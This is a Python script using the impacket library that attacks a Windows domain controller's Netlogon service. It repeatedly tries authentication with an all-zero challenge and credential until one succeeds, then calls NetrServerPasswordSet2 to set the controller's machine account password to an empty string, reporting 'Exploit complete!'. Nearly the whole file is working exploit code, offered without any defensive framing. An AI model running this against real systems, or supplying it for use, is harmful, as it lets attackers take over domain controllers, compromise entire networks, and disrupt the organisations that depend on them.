from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport
import sys

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%


class FlamingMeatus:
    def __init__(self, dc_name, dc_ip, dc_handle='\\\\'):
        self.dc_handle = dc_handle
        self.dc_ip = dc_ip
        self.dc_name = dc_name
        self.rpc_con = None

    def fail(self, msg):
        print(msg, file=sys.stderr)
        print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
        sys.exit(2)

    def try_zero_authenticate(self):
        # Connect to the DC's Netlogon service.


        # Use an all-zero challenge and credential.
        plaintext = b'\x00' * 8
        ciphertext = b'\x00' * 8

        # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
        flags = 0x212fffff

        # Send challenge and authentication request.
        nrpc.hNetrServerReqChallenge(self.rpc_con, self.dc_handle + '\x00', self.dc_name + '\x00', plaintext)
        try:
            server_auth = nrpc.hNetrServerAuthenticate3(
                self.rpc_con, self.dc_handle + '\x00', self.dc_name + '$\x00',
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, self.dc_name + '\x00', ciphertext, flags
            )


            # It worked!
            assert server_auth['ErrorCode'] == 0
            return True

        except nrpc.DCERPCSessionError as ex:
            # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
            if ex.get_error_code() == 0xc0000022:
                return None
            else:
                self.fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
        except BaseException as ex:
            self.fail(f'Unexpected error: {ex}.')

    def exploit(self):
        request = nrpc.NetrServerPasswordSet2()
        request['PrimaryName'] = self.dc_handle + '\x00'
        request['AccountName'] = self.dc_name + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = b'\x00' * 8
        authenticator['Timestamp'] = 0
        request['Authenticator'] = authenticator
        request['ComputerName'] = self.dc_name + '\x00'
        request['ClearNewPassword'] = b'\x00' * 516
        return self.rpc_con.request(request)

    def bind_rpc(self):
        binding = epm.hept_map(self.dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
        self.rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        self.rpc_con.connect()
        self.rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    def perform_attack(self):
        # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
        print('Performing authentication attempts...')
        for attempt in range(0, MAX_ATTEMPTS):
            result = self.try_zero_authenticate()

            if result is None:
                print('=', end='', flush=True)
            else:
                break


        if result:
            print('\nTarget vulnerable, changing account password to empty string')
            result = None
            for attempt in range(0, MAX_ATTEMPTS):
                try:
                    result = self.exploit()
                except nrpc.DCERPCSessionError as ex:
                    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                    if ex.get_error_code() == 0xc0000022:
                        pass
                    else:
                        self.fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
                except BaseException as ex:
                    self.fail(f'Unexpected error: {ex}.')
                if result is None:
                    print('=', end='', flush=True)
                else:
                    break

            print('\nResult: ', end='')
            print(result['ErrorCode'])
            if result['ErrorCode'] == 0:
                print('\nExploit complete!')
            else:
                print('Non-zero return code, something went wrong?')
        else:
            print('\nAttack failed. Target is probably patched.')
            sys.exit(1)
